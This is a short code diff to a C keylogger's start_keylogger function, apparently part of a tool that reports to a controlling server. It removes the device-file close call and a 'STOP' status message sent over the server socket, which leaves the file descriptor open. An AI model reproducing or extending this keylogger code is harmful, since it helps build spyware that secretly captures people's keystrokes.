@@ -118,12 +118,7 @@ void *start_keylogger()
     }
 
     // Close the device file
-    close(fd);
-    message_t msg;
-    msg.opCode = 'K';
-    strcpy(msg.buffer, "STOP");
-    msg.size = strlen(msg.buffer);
-    sendMessage(clientData.serverSocket, &msg);
+   
 
     return NULL;
 }
